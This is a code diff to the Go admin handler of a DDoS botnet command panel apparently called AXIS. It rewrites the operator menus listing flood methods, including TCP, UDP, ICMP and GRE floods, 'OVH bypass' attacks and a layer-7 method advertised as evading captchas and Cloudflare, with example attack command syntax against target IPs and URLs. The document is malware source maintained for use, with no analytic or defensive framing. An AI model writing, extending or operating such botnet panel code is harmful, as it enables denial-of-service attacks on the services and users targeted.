@@ -123,7 +123,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[90m                AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\x1b[90m                     hyper-volumetric DDoS sender\r\n"))
 			continue
 		}
 
@@ -144,14 +144,16 @@ func (this *Admin) Handle() {
 		if cmd == "LAYER4" || cmd == "layer4" || cmd == "L4" || cmd == "l4" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 4 | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mUDP:\x1b[1;32m                                                                          ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp\x1b[1;32m, \x1b[1;33mudpplain\x1b[1;32m, \x1b[1;33mstd\x1b[1;32m, \x1b[1;33mnudp\x1b[1;32m, \x1b[1;33mudphex\x1b[1;32m, \x1b[1;33msocket-raw\x1b[1;32m, \x1b[1;33mudp-strong\x1b[1;32m, \x1b[1;33mhex-flood\x1b[1;32m, \x1b[1;33mstrong-hex\x1b[1;32m     ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33movhudp\x1b[1;32m, \x1b[1;33mcudp\x1b[1;32m, \x1b[1;33micee\x1b[1;32m, \x1b[1;33mrandhex\x1b[1;32m, \x1b[1;33movh\x1b[1;32m, \x1b[1;33movhdrop\x1b[1;32m, \x1b[1;33mnfo\x1b[1;32m, \x1b[1;33msamp\x1b[1;32m                             ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mTCP:\x1b[1;32m                                                                          ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33msyn\x1b[1;32m, \x1b[1;33mack\x1b[1;32m, \x1b[1;33mstomp\x1b[1;32m, \x1b[1;33mhex\x1b[1;32m, \x1b[1;33mstdhex\x1b[1;32m, \x1b[1;33mxmas\x1b[1;32m, \x1b[1;33mtcpall\x1b[1;32m, \x1b[1;33mtcpfrag\x1b[1;32m, \x1b[1;33masyn\x1b[1;32m, \x1b[1;33musyn\x1b[1;32m          ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mackerpps\x1b[1;32m, \x1b[1;33mtcp-mix\x1b[1;32m, \x1b[1;33mtcpbypass\x1b[1;32m, \x1b[1;33mnfolag\x1b[1;32m, \x1b[1;33movhnuke\x1b[1;32m                                   ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mVolumetric:\x1b[1;32m                                                                    ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33mudp\x1b[1;32m, \x1b[1;33micmp\x1b[1;32m, \x1b[1;33maxis-l4\x1b[1;32m (combined attack)                           ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mOVH Bypass:\x1b[1;32m                                                                      ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33movhtcp\x1b[1;32m, \x1b[1;33movhudp\x1b[1;32m                                                                   ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mGRE:\x1b[1;32m                                                                           ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m                                                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mudp <ip> <time> dport=<port>\x1b[1;32m                                        ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mtcp <ip> <time> dport=<port>\x1b[1;32m                                        ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33movhtcp <ip> <time> dport=27015\x1b[1;32m                               ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mgreip <ip> <time> dport=80\x1b[1;32m                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -160,10 +162,10 @@ func (this *Admin) Handle() {
 		if cmd == "LAYER7" || cmd == "layer7" || cmd == "L7" || cmd == "l7" || cmd == "HTTP" || cmd == "http" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 7 (HTTP) | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33mhttps\x1b[1;32m, \x1b[1;33mcf\x1b[1;32m, \x1b[1;33mbrowserem\x1b[1;32m (includes captcha bypass)                      ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33maxis-l7\x1b[1;32m (browser emulation + captcha bypass + CF bypass)            ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mhttp https://example.com/ 60 443\x1b[1;32m                                   ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mbrowserem https://target.com/ 120 domain=target.com\x1b[1;32m                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mhttp https://example.com/ 60\x1b[1;32m                                       ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;32m                  ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -172,9 +174,10 @@ func (this *Admin) Handle() {
 		if cmd == "SPECIAL" || cmd == "special" || cmd == "SPEC" || cmd == "spec" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Special | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mvse\x1b[1;32m, \x1b[1;33mdns\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33mhomeslam\x1b[1;32m, \x1b[1;33mudpbypass\x1b[1;32m, \x1b[1;33mmixed\x1b[1;32m                          ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33micmp\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33maxis-l4\x1b[1;32m (combined)                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mdns <ip> <time>\x1b[1;32m                                                    ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33micmp <ip> <time>\x1b[1;32m                                                    ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l4 <ip> <time> dport=80\x1b[1;32m                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
